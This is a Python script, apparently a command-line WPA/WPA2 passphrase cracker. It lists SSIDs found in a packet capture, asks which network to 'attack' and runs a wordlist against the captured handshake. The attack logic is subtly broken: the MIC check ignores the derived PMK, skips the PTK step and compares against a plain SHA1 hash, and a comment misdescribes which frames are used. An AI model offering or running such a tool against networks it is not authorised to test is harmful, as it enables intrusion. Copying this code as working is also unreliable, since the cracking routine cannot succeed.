import sys
import argparse
from scapy.all import *
import hashlib
import binascii
from hashlib import pbkdf2_hmac

# Function to extract handshake from .cap or .pcap file
def extract_handshake(pcap_file):
    packets = rdpcap(pcap_file)
    eapol_frames = []

    for pkt in packets:
        if pkt.haslayer(EAPOL):
            eapol_frames.append(pkt)
    
    if len(eapol_frames) >= 4:
        return eapol_frames[:4]  # First 4 frames are required for WPA/WPA2 handshake
    
    return None

# Function to derive the Pairwise Master Key (PMK)
def derive_pmk(password, ssid):
    # The password and SSID are hashed together with PBKDF2
    pmk = pbkdf2_hmac('sha1', password.encode(), ssid.encode(), 4096, 32)
    return pmk

# Function to extract the MIC from the EAPOL frame and compare it with calculated MIC
def verify_mic(pmk, eapol_frames, version='WPA2'):
    # Extract the key material from the handshake (only using first and last EAPOL frame for simplicity)
    eapol_1 = eapol_frames[0]
    eapol_2 = eapol_frames[1]

    message = eapol_2.payload.load
    mic_in_frame = message[13:29]  # Extract MIC from EAPOL frame (this may differ for WPA)

    # Use PMK to create the Message Integrity Code (MIC)
    hmac_sha1 = hashlib.new('sha1', eapol_2.payload.load)
    derived_mic = hmac_sha1.digest()

    # Compare MIC
    if mic_in_frame == derived_mic:
        return True

    return False

# Function to attempt cracking passwords from the wordlist
def test_password(password, ssid, pcap_file):
    print(f"Trying passphrase: {password}")
    eapol_frames = extract_handshake(pcap_file)

    if not eapol_frames:
        print("No valid handshake found!")
        return False
    
    pmk = derive_pmk(password, ssid)
    if verify_mic(pmk, eapol_frames):
        print(f"KEY FOUND! [{password}]")
        return True
    
    return False

# Function to parse the wordlist file
def load_wordlist(wordlist_file):
    with open(wordlist_file, 'r') as f:
        return f.readlines()

# Main function to run the attack
def main():
    parser = argparse.ArgumentParser(description="WPA/WPA2 password recovery tool")
    parser.add_argument("capture_file", help="The capture file (.cap or .pcap) containing the WPA/WPA2 handshake")
    parser.add_argument("-P", "--wordlist", required=True, help="Wordlist file (.pwds) to use for password cracking")
    parser.add_argument("-v", "--version", choices=['WPA', 'WPA2'], default='WPA2', help="Specify WPA or WPA2 (default is WPA2)")
    args = parser.parse_args()

    capture_file = args.capture_file
    wordlist_file = args.wordlist
    version = args.version

    print(f"Loading wordlist: {wordlist_file}")
    wordlist = load_wordlist(wordlist_file)

    # Extract available networks from capture file
    print("Select a network to attack:")
    networks = {}
    packets = rdpcap(capture_file)
    count = 1
    for pkt in packets:
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Elt].info.decode(errors="ignore")
            bssid = pkt[Dot11].addr3
            if ssid not in networks:
                networks[ssid] = bssid
                print(f"{count}. SSID: {ssid}, BSSID: {bssid}")
                count += 1

    # Select network
    try:
        network_choice = int(input("\nEnter the number of the network to attack: "))
        network_ssid = list(networks.keys())[network_choice - 1]
        network_bssid = networks[network_ssid]
    except (ValueError, IndexError):
        print("Invalid selection.")
        sys.exit(1)

    print(f"Attacking network: {network_ssid} ({network_bssid})")

    # Test passwords from the wordlist
    for password in wordlist:
        password = password.strip()
        if test_password(password, network_ssid, capture_file):
            break
    else:
        print("KEY NOT FOUND")

if __name__ == "__main__":
    main()
